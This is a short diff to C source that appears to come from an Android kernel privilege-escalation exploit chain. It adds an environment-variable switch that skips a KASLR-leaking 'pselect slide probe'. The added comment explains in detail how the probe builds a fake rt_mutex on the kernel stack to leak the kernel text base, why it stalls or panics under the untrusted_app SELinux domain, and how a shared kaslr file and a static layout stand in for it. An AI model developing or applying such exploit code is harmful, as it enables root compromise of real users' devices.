@@ -429,6 +429,27 @@ static int parse_slide_shifts(int *out, int max_count) {
 }
 
 int slide_leak_kernel_base(void) {
+  /*
+   * app-uid reality (2026-10-20, untrusted_app + zygote seccomp): the
+   * pselect slide probe is structurally broken under this domain -- the
+   * fake rt_mutex laid out on the pselect kernel stack lands against
+   * SELinux per-fd check frames that the shell domain does not have, so
+   * the waiter walk either stalls forever (child never leaks stext, parent
+   * blocks in read()) or derefs stack garbage and panics the kernel
+   * (the observed BOOT_COMPLETED panic loop).  Every product of this
+   * probe has a fallback on our path: the text base comes from the shared
+   * kaslr file (ks_persist_kaslr_file, boot_id-gated) and pvo uses the
+   * static target layout.  So refuse the probe outright when asked --
+   * failing closed (kaslr leak failed -> pr_error -> chain exit) is safe,
+   * panicking is not.
+   */
+  const char *skip = getenv("KS_SLIDE_SKIP");
+  if (skip && skip[0] && strcmp(skip, "0") != 0 &&
+      strcasecmp(skip, "false") != 0 && strcasecmp(skip, "no") != 0) {
+    pr_warning("KS_SLIDE_SKIP: refusing pselect slide probe (app uid "
+               "stalls/panics; shared file + static layout cover it)\n");
+    return 0;
+  }
   int shifts[16];
   int n_shifts = parse_slide_shifts(shifts,
                                     (int)(sizeof(shifts) / sizeof(shifts[0])));
